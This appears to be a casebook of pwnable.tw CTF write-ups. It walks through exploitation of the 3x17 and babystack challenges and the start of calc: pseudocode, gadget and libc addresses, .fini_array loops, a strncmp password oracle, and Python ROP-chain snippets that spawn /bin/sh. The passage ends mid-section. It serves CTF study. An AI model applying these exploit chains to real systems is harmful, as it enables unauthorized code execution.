# Pwnable.tw Stack-Control Cases

Historical casebook migrated from the source `pwnable.tw` write-up corpus. Exploit examples are for authorized CTF replay and research.

## How To Use This File

Use this file when the first exploitable defect is stack layout, return address, saved EBP, stack pivot, format string, `.fini_array`, SROP, ret2dlresolve, closed-FD stack control, or executable-stack shellcode. Do not start here merely because the final payload is ROP; route by the first memory-corruption or control-data defect.

## Case Index

| Challenge | Canonical route |
|---|---|
| [`3x17`](#3x17) | One-shot 24-byte arbitrary write → .fini_array re-entry loop, leave;ret pivot, and static execve ROP |
| [`babystack`](#babystack) | Attacker-length `strncmp` password oracle → Residual leak, shared-frame `strcpy` overflow, custom canary restoration, and ROP |
| [`calc`](#calc) | Zero-token operand-index underflow → Arbitrary stack read/write, static x86 ROP, or mprotect/shellcode |
| [`de_aslr`](#de_aslr) | No-leak stack overflow → GOT pivot/ret2dlresolve and arithmetic gadget transform of resolved `gets` into `execve` |
| [`dubblesort`](#dubblesort) | Unbounded element count plus non-numeric slot skip → Canary preservation during sort and ret2libc |
| [`kidding`](#kidding) | Stack overflow with closed standard FDs → mprotect/RWX, `_dl_make_stack_executable`, reverse socket, or ROP |
| [`printable`](#printable) | Blind format string with closed stdout and immediate exit → .fini_array/link-map re-entry, stdout/stderr swap, BSS pivot, or ROP |
| [`silver_bullet`](#silver_bullet) | `strncat` off-by-null state corruption → Length mismatch overflow, ret2plt leak, BSS pivot, and GOT write |
| [`spirited_away`](#spirited_away) | `sprintf` count/state spill → Oversized comment overwrites heap name pointer; fake stack chunk and ret2libc |
| [`start`](#start) | Return-address overwrite → `write` gadget leaks ESP, then shellcode executes |
| [`starbound`](#starbound) | Signed-index OOB call → Function/data call, stack pivot, format leak, GOT/system, or syscall ROP |
| [`unexploitable`](#unexploitable) | RBP/RIP stack control with no output/syscall → Writable GOT low-byte adjacent syscall, SROP, ret2csu, or alternate chain |


## 3x17
> **Canonical route:** One-shot 24-byte arbitrary write → .fini_array re-entry loop, leave;ret pivot, and static execve ROP
> **Read this case when:** A static stripped binary asks for an address plus 24 data bytes and exits.
> **Primary defect:** One-shot 24-byte arbitrary write
> **Exploit primitive/result:** .fini_array re-entry loop, leave;ret pivot, and static execve ROP
> **Search terms:** `memcpy`; `.fini_array`; `__libc_csu_fini`; `0x4B40F0`; `leave; ret`; static ROP
> **Version/protection clue:** Case target `3x17` — x86-64, static/stripped, Partial RELRO, no canary/NX/PIE
> **Variant boundary:** Standalone case; no conventional GOT/PLT route applies.

### Metadata

```yaml
tags:
  - arbitrary-write
  - fini-array-overwrite
  - rop
  - static-binary
platform: pwnable.tw
points: 150
arch: x86-64
libc: static
relro: partial
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "An arbitrary 24-byte write allows overwriting .fini_array entries to loop __libc_csu_fini, pivoting RSP to user input and executing a ROP chain to invoke execve."
proof-of-concept: no
```

Historical service/flag:
> `nc chall.pwnable.tw 10105`
>
> Flag: `FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}`

Source title: 3x17 — pwnable.tw (150 pts)
Source record: `/home/hungnt/pwn-knowledge-base/linux-userland-ctf/pwnable.tw/3x17/README.md`.

### Facts

Source facts are preserved below without paraphrase-induced loss; source headings are demoted to H4/H5.

#### Challenge Overview

A statically linked, stripped x86-64 ELF binary (no PIE, no canary, NX enabled). The binary provides a single arbitrary write primitive: it prompts for an address and 24 bytes of data, writes the data to the address, then exits. The challenge is to turn this one-shot write into a shell.

```text
checksec:
  Arch:     amd64-64-little
  RELRO:    Partial RELRO
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE (0x400000)
```

**Binary type:** Statically linked (no libc.so — all libc functions inlined). No dynamic loader, no GOT/PLT in the usual sense.

#### Reverse Engineering

##### `main` (0x401B6D)

The `main` function is simple:

```c
// Pseudocode of main @ 0x401B6D
void main() {
    char buf[24];
    unsigned long addr;

    write(1, "addr:", 5);
    read(0, buf, 24);
    addr = strtoul(buf, NULL, 10);  // parse address as decimal

    write(1, "data:", 5);
    read(0, buf, 24);               // read exactly 24 bytes of data

    // Guard: only write once (byte at 0x4B9330 is checked)
    if (byte_4B9330 != 0) {
        return;                     // exit without writing
    }
    byte_4B9330 = 1;
    memcpy((void *)addr, buf, 24);  // arbitrary 24-byte write
}
```

**Key details:**
- Address is parsed as a **decimal** (or with `+` prefix) string via `strtoul`
- Data is exactly **24 bytes** (3 qwords)
- A **one-shot guard** at `0x4B9330` prevents re-entry — once set to 1, subsequent calls skip the write
- The binary then returns through the normal exit path: `main` → `__libc_start_main` → `exit()` → `.fini_array` destructors

##### `__libc_csu_fini` (0x402960)

The destructor-calling routine invoked during `exit()`:

```asm
; __libc_csu_fini @ 0x402960
; Calls .fini_array entries in REVERSE order: [1], then [0]
mov  rbp, qword [0x4B40F8]   ; .fini_array end pointer
...
0x402988: call qword [rbp+rbx*8]  ; call .fini_array[i]
; decrements rbx, loops until rbx == -1
```

**Critical behavior:** When `__libc_csu_fini` runs:
- `rbp` is set to `.fini_array` base (`0x4B40F0`)
- It calls `.fini_array[1]` first, then `.fini_array[0]`
- After calling `.fini_array[0]`, `rbp` still points to `0x4B40F0`

#### Vulnerabilities

##### V1 — Unrestricted Arbitrary Write (Primary)

**Root Cause:** `main` writes 24 bytes to any user-supplied address with no bounds checking. The `.fini_array` section at `0x4B40F0` is writable (Partial RELRO), and the binary is not PIE, so all addresses are known.

```c
memcpy((void *)addr, buf, 24);  // write 24 bytes anywhere
```

##### V2 — `.fini_array` Loop: One Write → Infinite Writes

**Root Cause:** The `.fini_array` is called during `exit()`. By overwriting it with `{__libc_csu_fini, main}`, a self-reinforcing loop is created:

1. `exit()` → `__libc_csu_fini` → calls `.fini_array[1]` = `main` → user gets another write
2. `main` returns → `__libc_csu_fini` continues → calls `.fini_array[0]` = `__libc_csu_fini` → loop repeats

**The guard byte at `0x4B9330`** wraps around after 256 iterations (it's a `uint8_t` that increments each call), so writes remain possible for 256 rounds.

```python
# Turn one write into infinite writes:
write(0x4B40F0, p64(0x402960) + p64(0x401B6D))
#                    __libc_csu_fini    main
```

##### V3 — Stack Pivot via `leave; ret`

**Root Cause:** At the end of `main` (address `0x401C4B`), there is a `leave; ret` instruction. Since `rbp` points to `.fini_array` (`0x4B40F0`) during the destructor calls, executing `leave; ret` as `.fini_array[0]` sets `rsp = 0x4B40F0 + 8 = 0x4B40F8`, pivoting the stack into writable memory where the attacker has placed a ROP chain.

```asm
; 0x401C4B:
leave       ; rsp = rbp; pop rbp → rsp = 0x4B40F8
ret         ; pop rip from 0x4B40F8 → jumps to value at .fini_array[1]
```

#### Key Addresses

| Address | Symbol | Purpose |
|---------|--------|---------|
| `0x4B40F0` | `.fini_array[0]` | First destructor (called second) |
| `0x4B40F8` | `.fini_array[1]` | Second destructor (called first) |
| `0x402960` | `__libc_csu_fini` | Destructor caller — creates the loop |
| `0x401B6D` | `main` | Arbitrary 24-byte write |
| `0x401C4B` | `leave; ret` | Stack pivot gadget (end of main) |
| `0x4B9330` | guard byte | One-shot write guard (wraps at 256) |

#### ROP Gadgets (Statically Linked — Abundant)

```python
POP_RDI  = 0x401696   # pop rdi; ret
POP_RSI  = 0x406C30   # pop rsi; ret
POP_RDX  = 0x446E35   # pop rdx; ret
POP_RAX  = 0x41E4AF   # pop rax; ret
SYSCALL  = 0x4022B4   # syscall; ret  (or 0x471DB5, 0x446ECF — multiple exist)
LEAVE_RET = 0x401C4B  # leave; ret
RET      = 0x401016   # ret (alignment)
```

Some solvers also use:
```python
POP_RDX_RSI = 0x44A309  # pop rdx; pop rsi; ret (combined gadget)
MOV_QWORD_RSI_RAX = 0x47C1B1  # mov [rsi], rax; ret (for writing /bin/sh)
ADD_RAX_1 = 0x471810  # add rax, 1; ret (for building rax=59 incrementally)
XOR_RAX   = 0x442110  # xor rax, rax; ret
```

### Exploit Paths

All source paths, variants, reliability notes, diagrams, addresses, offsets, and non-exploitable findings are retained.

#### Exploit Paths

All solutions follow the same fundamental three-phase approach, differing only in ROP chain construction details.

---

##### Path A — `.fini_array` Loop + Direct ROP at `.fini_array+0x10` + `leave; ret` Pivot (Most Common)

**Used by:** ~90% of solutions (138, 1316, 1763, 11445, 11699, 12245, 13060, 13484, 15522, 15883, 15989, 16439, 16609, 16991, 17048, 18324, exp.py, etc.)

**Steps:**

1. **Create the write loop:** First write overwrites `.fini_array` with `{__libc_csu_fini, main}`. This gives unlimited 24-byte writes.

```python
write(0x4B40F0, p64(0x402960) + p64(0x401B6D))
```

2. **Write ROP chain** to memory starting at `.fini_array + 0x10` (or `.bss`, or any writable area). The chain performs `execve("/bin/sh", NULL, NULL)`:

```python
# Typical chain written in 24-byte chunks:
write(0x4B4100, p64(POP_RAX) + p64(59)       + p64(POP_RDI))
write(0x4B4118, p64(BINSH)   + p64(POP_RSI)  + p64(0))
write(0x4B4130, p64(POP_RDX) + p64(0)        + p64(SYSCALL))
```

3. **Write `/bin/sh\0`** to a known writable address (BSS or after the chain).

4. **Trigger the pivot:** Final write overwrites `.fini_array[0]` with `leave; ret`. When `main` returns and `__libc_csu_fini` calls this as a destructor:
   - `leave` sets `rsp = rbp + 8 = 0x4B40F8`
   - `ret` pops the next value as RIP → begins executing the ROP chain

```python
write(0x4B40F0, p64(0x401C4B))  # leave; ret
```

**Variant — Chain placement:** Some place the ROP at `.fini_array + 0x10` (contiguous with the array), others at `.bss` (`0x4B9300+`) or `.data.rel.ro` (`0x4B4100`). The pivot address just needs to be `0x4B40F8` for the `leave; ret` to work, so `.fini_array[1]` must be the first gadget of the chain.

```python
# Final write (common pattern):
write(0x4B40F0, p64(LEAVE_RET) + p64(POP_RDI) + p64(BINSH))
# leave;ret pivots rsp to 0x4B40F8, pops POP_RDI as rip
```

---

##### Path B — ROPgadget Auto-Chain with `mov [rsi], rax` + `add rax, 1` (Variant)

**Used by:** Solutions 11968, 14605, 15989

Instead of using `pop rax; ret` with immediate 59, these use ROPgadget's auto-generated chain:
- Write `/bin//sh` to `.data` using `pop rsi; pop rax; mov [rsi], rax; ret`
- Build `rax = 59` by 59× `add rax, 1; ret` after `xor rax, rax; ret`
- Much longer chain but avoids needing a direct `pop rax` with value 59

This results in a much longer ROP chain (~60+ gadgets) but works identically.

---

##### Path C — Alternative Loop via Overwriting Call Target (Rare)

**Used by:** Solution 1324

Instead of the standard `.fini_array` loop, overwrites `.init_array` and uses the init/fini interaction:

```python
write(INIT_ARRAY, p64(stack_pivot_gadget) + p64(another_gadget))
write(FINI_ARRAY, p64(INIT_CALL) + p64(0x1337))  # trigger init_array
```

Same end result but via a different code path.

---

##### Path D — Canary Leak + Stack Overflow + `pop rsp` Pivot (Rare)

**Used by:** Solution 14479

An unusual approach that:
1. Uses the write loop to overwrite function pointers to create a read primitive
2. Leaks the stack canary from memory
3. Writes a ROP chain to BSS
4. Overwrites the return address with `pop rsp; ret` → ROP chain address
5. Sends a large payload with the canary to overflow the stack and pivot

This is significantly more complex than the `.fini_array` approach.

---

##### Path E — `__exit_funcs` / Custom Call Chain (Rare)

**Used by:** Solution 1351

Uses deeper glibc internal structures (`__exit_funcs` at `0x4B9FC0`) to hijack the exit handler chain instead of the simpler `.fini_array` approach. Writes fake function descriptors that redirect through `leave; ret` to the ROP chain.

#### Exploit Flow Diagram

```text
One-shot write
    │
    ▼
Overwrite .fini_array = {__libc_csu_fini, main}
    │
    ▼
main returns → exit() → __libc_csu_fini
    │                         │
    │    calls .fini_array[1] = main  ◄──── User gets another write
    │                         │
    │    calls .fini_array[0] = __libc_csu_fini  ◄──── Loop continues
    │
    ▼  (after writing ROP chain + /bin/sh)
Overwrite .fini_array[0] = leave;ret
    │
    ▼
leave;ret pivots rsp to .fini_array+8
    │
    ▼
ROP chain: execve("/bin/sh", 0, 0) → shell
```

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Arbitrary 24-byte write | `main` — no bounds check on address | Deterministic (100%) |
| Infinite writes | `.fini_array` loop trick | Deterministic |
| Stack pivot | `leave; ret` with `rbp` = `.fini_array` | Deterministic |
| Code execution | ROP → `execve` syscall | Deterministic |
### Assets and Provenance

Source write-up IDs, primary paths, technique notes, solution counts, exploit names, artifact descriptions, and provenance are retained.

#### Solution Write-ups

| File | Path | Key Variation | Notes |
|------|------|---------------|-------|
| `138.md` | A | Ruby; chain at `.fini_array+0x10` | Clean minimal approach |
| `1177.md` | A | Uses `mprotect` then sends shellcode | Unique: RWX + shellcode |
| `1297.md` | A | Chain at `0x4B93E0`; `pop rsp` in final | Standard with separate chain area |
| `1316.md` | A | Chain at `.fini_array+0x10` | Uses `pop rdx; pop rsi; ret` combined |
| `1324.md` | C | Via `.init_array` manipulation | Non-standard loop mechanism |
| `1351.md` | E | Via `__exit_funcs` internal struct | Deep glibc internals |
| `1763.md` | A | Chain at `0x4B4100` | Minimal clean solution |
| `11968.md` | B | ROPgadget auto-chain; 59× `add rax,1` | Very long chain, works correctly |
| `14334.md` | A | Chain at `0x4B4108`; well-documented | Good comments explaining each step |
| `14479.md` | D | Canary leak + stack overflow | Complex: leaks canary, uses large payload |
| `17704.md` | A | Includes decompiled `fini()` pseudocode | Explains the v0 loop variable |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (pure Python, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/3x17` | Original challenge binary (static, stripped, x86-64) |
| `solution/*.md` | Community write-ups (122 solutions) |


## babystack
> **Canonical route:** Attacker-length `strncmp` password oracle → Residual leak, shared-frame `strcpy` overflow, custom canary restoration, and ROP
> **Read this case when:** Login succeeds with empty input and a `Copy` action shares the login stack frame.
> **Primary defect:** Attacker-length `strncmp` password oracle
> **Exploit primitive/result:** Residual leak, shared-frame `strcpy` overflow, custom canary restoration, and ROP
> **Search terms:** `strncmp`; empty login; byte oracle; custom canary; `strcpy`; libc residual
> **Version/protection clue:** Case target `babystack` — x86-64, glibc 2.23, Full RELRO, canary/NX/PIE
> **Variant boundary:** Standalone; use the login oracle before blind ROP.

### Metadata

```yaml
tags:
  - information-leak
  - brute-force-oracle
  - stack-buffer-overflow
  - rop
platform: pwnable.tw
points: 250
arch: x86-64
libc: glibc-2.23
relro: full
canary: yes
nx: yes
pie: yes
references:
  - https://pwnable.tw/challenge/
description: "A password verification oracle using strncmp enables byte-by-byte recovery of the stack canary and randomized password, permitting stack buffer overflow into a ROP chain."
proof-of-concept: no
```

Historical service/flag:
> `nc chall.pwnable.tw 10205`
>
> Flag: `FLAG{Its_juS7_a_st4ck0v3rfl0w}`

Source title: BabyStack — pwnable.tw (250 pts)
Source record: `/home/hungnt/pwn-knowledge-base/linux-userland-ctf/pwnable.tw/babystack/README.md`.

### Facts

Source facts are preserved below without paraphrase-induced loss; source headings are demoted to H4/H5.

#### Challenge Overview

A stripped x86-64 PIE binary with full protections, linked against glibc 2.23. The program implements a simple login/logout menu with a 16-byte random password read from `/dev/urandom`. The password also serves as a custom "canary" — it must remain intact for the program to `return` cleanly from `main` (checked via `memcmp` against an mmap'd backup). Two helper functions (`Login` and `Copy`) share the same stack frame location, enabling a `strcpy`-based overflow.

```text
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO           # GOT not writable
  Stack:    Canary found         # custom canary, not glibc __stack_chk
  NX:       NX enabled
  PIE:      PIE enabled
  FORTIFY:  Enabled
```

#### Program Logic

##### `main` Stack Frame (`sub rsp, 0x60`)

| Offset from rbp | Field | Size |
|------------------|-------|------|
| `rbp-0x60` | `copy_dest` — Copy writes here via `strcpy` | 64 bytes |
| `rbp-0x20` | `password` — 16 random bytes from `/dev/urandom` | 16 bytes |
| `rbp-0x10` | `choice` — menu input buffer | 16 bytes |
| `rbp+0x00` | saved rbp | 8 bytes |
| `rbp+0x08` | **return address** (to `__libc_start_main`) | 8 bytes |

Distance from `copy_dest` to return address: **0x68 = 104 bytes**.

##### Menu

```c
while (1) {
    __read_chk(0, choice, 16, 16);
    switch (choice[0]) {
        case '1':
            if (logged_in) logged_in = 0;   // logout
            else Login(password);            // authenticate
            break;
        case '2':
            if (logged_in) {
                if (memcmp(password, mmap_backup, 16) == 0) {
                    eax = 0; return;         // clean exit — triggers ret
                } else __stack_chk_fail();   // password tampered
            } else exit(0);
            break;
        case '3':
            if (logged_in) Copy(copy_dest);  // magic copy
            break;
    }
}
```

##### `Login(passwd)` — `sub rsp, 0x90`, buf at `Login_rbp-0x80`

```c
printf("Your passowrd :");
my_read(buf, 0x7f);                          // read up to 127 bytes
if (strncmp(buf, passwd, strlen(buf)) == 0)
    logged_in = 1;                            // "Login Success !"
```

##### `Copy(dst)` — `sub rsp, 0x90`, buf at `Copy_rbp-0x80`

```c
printf("Copy :");
my_read(buf, 0x3f);                          // read up to 63 bytes
strcpy(dst, buf);                             // dst = main's rbp-0x60
puts("It is magic copy !");
```

##### `my_read(buf, n)`

```c
r = read(0, buf, n);
if (buf[r-1] == '\n') buf[r-1] = '\0';       // NUL-terminates ONLY if last byte is '\n'
```

**Critical:** `Login` and `Copy` are called from `main` at the same call depth → their local buffers (`rbp-0x80`) occupy the **exact same stack memory**.

#### Vulnerabilities

##### V1 — `strncmp` with `strlen(input)` — Password Oracle / Auth Bypass

**Root Cause:** `Login` compares the user-supplied buffer against the password using `strncmp(buf, passwd, strlen(buf))`. The comparison length is controlled by the attacker.

```c
strncmp(buf, passwd, strlen(buf))
```

**Auth Bypass:** Sending `\x00` (empty string, `strlen == 0`) → `strncmp(..., 0) == 0` → Login Success. This sets `logged_in = 1` without knowing the password.

**Byte-by-Byte Oracle:** Sending `known_prefix + guess_byte + \x00` causes `strncmp` to compare exactly `len(prefix)+1` bytes. "Login Success" means the guess byte matched → brute-force the 16-byte password one byte at a time (~128 avg attempts per byte, ~2048 total queries).

##### V2 — `strcpy` Overflow via Shared Stack Frame

**Root Cause:** `Login` and `Copy` share the same stack buffer location. `Login` can write up to 127 bytes into the buffer, but `Copy` only reads 63 bytes into it via `my_read`. When `Copy` then calls `strcpy(dst, buf)`, it copies from the shared buffer — but `strcpy` only stops at NUL. If `Login` previously filled bytes 63–126 with non-NUL data, `strcpy` copies **far past 63 bytes**, overflowing into `main`'s password slot, saved rbp, and return address.

```text
Login fills: buf[0..126]  (127 bytes, no NUL at end if no '\n')
Copy reads:  buf[0..62]   (63 bytes, overwrites only first 63)
strcpy:      copies buf[0..NUL) → main's copy_dest (rbp-0x60)
             continues past 63 bytes using Login's leftover data
             → overwrites password (rbp-0x20) and return address (rbp+0x08)
```

**Impact:** Full control over main's return address (offset 0x68 from `copy_dest`). The password slot (offset 0x40) must be restored to its original value for the `memcmp` check to pass on exit.

##### V3 — Libc Pointer Residue on Stack

**Root Cause:** After `Copy` calls `strcpy` and `puts`, libc-internal function calls leave return addresses and other libc pointers on the stack frame. Because `Login` and `Copy` share the same frame, a subsequent `Login` call can observe these residual libc pointers at known offsets within the buffer.

**Impact:** By first overwriting the password slot with known non-NUL bytes (e.g., `'C'*8`) via the overflow, then using the oracle to brute-force the 6 bytes that follow, the attacker recovers a libc address. The leaked value is typically `_IO_file_setbuf+9` or `_IO_file_overflow+235` (offset `0x78439` or `0x7a81b` from libc base).

### Exploit Paths

All source paths, variants, reliability notes, diagrams, addresses, offsets, and non-exploitable findings are retained.

#### Exploit Paths

All solutions share the same fundamental primitives: V1 (oracle) for leaking, V2 (strcpy overflow) for control. They differ in what they leak and what they overwrite the return address with.

---

##### Path A — Leak Password + Leak libc + One-Gadget (Most Common)

**Used by:** Solutions 8, 370, 821, 3498, 7905, 25572, 34817, 38891, and many others

1. **Brute-force the 16-byte password** via the `strncmp` oracle. If any byte is `\x00`, reconnect (fresh random password).

2. **Leak libc address:**
   - `Login` with `\x00 + 'A'*63 + 'A'*8` (no newline) → fills buffer past 63 bytes. The `\x00` first byte bypasses auth (`strlen == 0` → success, `logged_in = 1`).
   - `Copy` with any short input → `strcpy` copies the full buffer into `main`'s `copy_dest`. The residual libc pointer from the shared stack overwrites the password slot.
   - Toggle logout (`'1'`), then brute-force the new "password" bytes — these are now the libc pointer.
   - `leaked - 0x78439 = libc_base` (or `leaked - 0x7a81b` depending on runtime).

3. **Overwrite return address:**
   - `Login` with `\x00 + 'A'*63 + password + 'B'*24 + p64(one_gadget)` (no newline).
   - `Copy` → `strcpy` overflows `copy_dest`, restoring password at offset 0x40 and placing `one_gadget` at offset 0x68 (return address).

4. **Trigger:** Send `'2'` → `memcmp` passes (password restored) → `mov eax, 0; leave; ret` → jumps to one_gadget. Since `eax == 0` (set by memcmp return), the `rax == NULL` constraint is satisfied.

**One-gadget offsets (glibc 2.23):**
```python
0x45216   # rax == NULL (preferred — satisfied by memcmp eax=0)
0x4526a   # [rsp+0x30] == NULL
0xef6c4   # [rsp+0x50] == NULL
0xf0567   # [rsp+0x70] == NULL
```

**Reliability:** ~94% per connection. Fails only if the random password contains a NUL byte (~6% chance), since `strcpy` stops at NUL and can't restore it.

---

##### Path B — Leak Password + Leak PIE Base + ROP Chain

**Used by:** Solutions 59, 278, 533, 2605, 9952, 10128, 13019

This variant additionally leaks the PIE base to build a ROP chain using binary gadgets:

1. **Brute-force password** (same as Path A).

2. **Leak PIE base:** After the password (offset 0x40 in `copy_dest`), the next stack slot at `main_rbp-0x10` contains `__libc_csu_init` (PIE address `0x1060`). Use the overflow + oracle to read 6 bytes beyond the password → `PIE_base = leaked - 0x1060`.

3. **First overflow → ret to `read_n`:** Overwrite return address with the binary's `my_read` gadget (`PIE+0xca0`). When main returns, it calls `my_read` with whatever `rdi`/`rsi` happen to be, enabling a **second, larger stack overflow** with arbitrary bytes (no `strcpy` NUL limitation).

4. **Second overflow → full ROP:**
   - `pop rdi; ret` + GOT entry + `puts@plt` → leak libc at runtime.
   - `pop rdi; ret` + `"/bin/sh"` + `system` → shell.
   - Or pivot stack to BSS, chain `read` for a third payload.

**Advantages:** Can write NUL bytes in ROP chain (second overflow uses `read`, not `strcpy`). Can use `system("/bin/sh")` instead of one-gadget constraints.

**Disadvantages:** Requires PIE leak (~2048 more oracle queries), two return-to-main cycles (re-leak password on second iteration if main restarts), more complex.

---

##### Path C — Leak Password + Libc Leak + `system` via Choice Buffer

**Used by:** Solutions 331, 821 (variant)

A simpler variation that avoids one-gadget constraints:

1. **Password + libc leak** (same as Path A).
2. **Overwrite return address with `system`.**
3. **Trigger with `'2;sh;\x00'`** as the menu choice — the 16-byte choice buffer starts with `'2'` (triggers exit path), but the same buffer at `choice+2` contains `"sh"`. Since `system` receives `rdi` pointing to the choice buffer region on the stack, it executes `system("sh")`.

**Note:** This is fragile — `rdi` must point to the right stack location containing `"sh"`. Some solutions use `"2;bash\x00"` or `"2;/bin/sh;"`.

---

##### Path D — Null-Byte-Safe ROP via Incremental Writes

**Used by:** Solutions 278, 9952

Addresses containing NUL bytes can't be written via `strcpy` in one shot. This approach writes the ROP chain incrementally:

1. For each NUL byte in the target ROP payload, write everything **after** that NUL in a separate `Login+Copy` cycle. Each cycle places a NUL-terminated string at a different offset.
2. Process NUL positions from highest to lowest, building up the full payload across multiple rounds.
3. Finally restore the password and trigger return.

This allows arbitrary ROP chains without NUL byte restrictions.

#### Key Observations

##### Stack Layout — Login/Copy Shared Buffer

```text
             Login/Copy frame               main frame
             ┌──────────────┐          ┌──────────────────┐
rbp-0x80     │ buf[0..126]  │          │                  │
             │  (Login: 127)│          │ copy_dest[0..63] │ rbp-0x60
             │  (Copy:   63)│          │                  │
             │              │          │ password[0..15]  │ rbp-0x20
             │              │          │ choice[0..15]    │ rbp-0x10
             └──────────────┘          │ saved rbp        │ rbp+0x00
                                       │ return address   │ rbp+0x08
                                       └──────────────────┘
```

Login's `buf[0..62]` maps to `copy_dest[0..62]` after `strcpy`.
Login's `buf[63..78]` maps to `copy_dest[63..78]` = password slot + beyond.
Login's `buf[79..103]` maps to the saved rbp and return address region.

##### Oracle Interaction Protocol

The menu reads exactly 16 bytes via `__read_chk(0, choice, 16, 16)`. Pipelining is possible by sending `"1" + 15_pad_bytes + password_guess` in one TCP segment. Login's `my_read` reads up to 127 bytes greedily, so padding the body to exactly 127 bytes self-frames each query.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Password oracle (byte-by-byte) | V1: `strncmp` + `strlen(input)` | Deterministic (~2048 queries) |
| Auth bypass (empty string) | V1: `strlen("\x00") == 0` | Deterministic |
| Stack overflow via `strcpy` | V2: shared frame + `strcpy` past 63 | Deterministic (no NUL in payload) |
| Libc leak (residual pointer) | V3: shared frame + overflow + oracle | Deterministic |
| PIE leak (optional) | V3: overflow deeper + oracle | Deterministic |
| Return address overwrite | V2: `copy_dest + 0x68 = ret addr` | Deterministic |
| `memcmp` bypass | Restore password at `copy_dest + 0x40` | Fails if password has NUL (~6%) |

#### Offsets (pwnable.tw `libc_64.so.6`, glibc 2.23)

```python
# Libc leak offsets (residual pointer on stack)
_IO_file_setbuf_plus_9  = 0x78439    # common in direct process
_IO_file_overflow_plus_235 = 0x7a81b # common under fork-server/socat

# Gadgets
one_gadget_rax_null  = 0x45216   # rax == NULL (best — memcmp sets eax=0)
one_gadget_rsp30     = 0x4526a   # [rsp+0x30] == NULL
one_gadget_rsp50     = 0xef6c4   # [rsp+0x50] == NULL
one_gadget_rsp70     = 0xf0567   # [rsp+0x70] == NULL
system               = 0x45390
bin_sh               = 0x18c177
__libc_start_main    = 0x20740
puts                 = 0x6f690

# PIE offsets (if PIE leak used)
__libc_csu_init      = 0x1060
main                 = 0xecf
my_read              = 0xca0
puts_plt             = 0xae0
pop_rdi_ret          = 0x10c3
pop_rsi_r15_ret      = 0x10c1
```
### Assets and Provenance

Source write-up IDs, primary paths, technique notes, solution counts, exploit names, artifact descriptions, and provenance are retained.

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `8.md` | A | password oracle → libc leak → one_gadget | Clean Python, detailed comments |
| `59.md` | B | password + PIE oracle → ret-to-read → ROP | Two-stage ROP; stack pivot to BSS |
| `278.md` | B + D | PIE leak → incremental NUL-safe ROP → puts leak | Ruby; handles NUL bytes in ROP chain |
| `331.md` | C | password → libc → `system` via choice buf | Uses `"2;bash\x00"` as choice to trigger system |
| `370.md` | A | password → libc → one_gadget (0xf0567) | Also leaks PIE but uses one_gadget |
| `533.md` | B | PIE leak → ret-to-read → `execve` ROP | Full `execve` call via ROP |
| `821.md` | A | pipelined oracle → libc → `system` | Batched queries for speed |
| `2605.md` | B | PIE + stack leak → ret-to-read → one_gadget | Leaks stack address for pivot |
| `3498.md` | A | password → libc → one_gadget (0xf0567) | Concise; `flat()` for payload |
| `7905.md` | A | password → libc → one_gadget (0x45216) | Most detailed writeup; full Chinese analysis |
| `9952.md` | B + D | PIE → incremental write → puts leak → ROP | `build_rop` handles NUL-free writes |
| `10128.md` | B | PIE + stack → ret-to-read → stack pivot | Uses `pop rsp` gadget |
| `25572.md` | A | password → libc → one_gadget | Detailed taintedbits.com writeup |
| `34817.md` | A | password → libc (`_IO_file_setbuf+9`) → one_gadget | Clean Python3 |
| `38891.md` | A | password → libc → one_gadget (0x45216) | Minimal code |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (pure sockets, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/babystack` | Original challenge binary (stripped PIE ELF) |
| `artifacts/libc_64.so.6` | Remote libc (glibc 2.23) |
| `solution/*.md` | Community write-ups (132 solutions) |


## calc
> **Canonical route:** Zero-token operand-index underflow → Arbitrary stack read/write, static x86 ROP, or mprotect/shellcode
> **Read this case when:** A calculator expression parser treats zero as a token that changes operand indexing without pushing a value.
> **Primary defect:** Zero-token operand-index underflow
> **Exploit primitive/result:** Arbitrary stack read/write, static x86 ROP, or mprotect/shellcode
> **Search terms:** calculator; expression parser; operand pool; zero token; index 361; `int 0x80`
> **Version/protection clue:** Case target `calc` — i386, static, Partial RELRO, canary/NX, no PIE
> **Variant boundary:** Standalone; route by parser index underflow, not generic integer overflow.

### Metadata

```yaml
tags:
  - integer-underflow
  - stack-buffer-overflow
  - rop
  - static-binary
platform: pwnable.tw
points: 150
arch: i386
libc: static
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "An integer underflow in arithmetic expression token indexing allows arbitrary stack read and write, enabling ROP chain construction on the return address."
proof-of-concept: no
```

Historical service/flag:
> `nc chall.pwnable.tw 10100`
>
> Flag: `FLAG{C:\Windows\System32\calc.exe}`

Source title: calc — pwnable.tw (150 pts)
Source record: `/home/hungnt/pwn-knowledge-base/linux-userland-ctf/pwnable.tw/calc/README.md`.

### Facts

Source facts are preserved below without paraphrase-induced loss; source headings are demoted to H4/H5.

#### Challenge Overview

A statically linked, 32-bit calculator binary that evaluates arithmetic expressions. The user enters expressions like `1+2*3`, and the program prints the result. It supports `+`, `-`, `*`, `/`, and `%`. Input is read line-by-line; an empty line exits the calculator.

```text
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE               # fixed base 0x08048000
  Linking:  Statically linked     # no libc.so — all gadgets in binary
```

The binary is **not stripped** — symbols like `calc`, `parse_expr`, `eval`, `get_expr`, `init_pool` are visible.

#### Architecture

##### `calc()` — main calculator loop

```text
calc():
  sub  esp, 0x5b8
  canary = gs:0x14             // stack canary at ebp-0xc
  pool[0..0x161]               // operand pool at ebp-0x5a0 (int pool[0x162])
                               // pool[0] = count, pool[1..N] = operands
  input_buf[0x400]             // at ebp-0x40c

  loop:
    bzero(input_buf, 0x400)
    if (!get_expr(input_buf, 0x400)) return
    init_pool(pool)            // pool[0] = 0
    if (parse_expr(input_buf, pool))
      printf("%d\n", pool[pool[0]])   // print top of operand stack
```

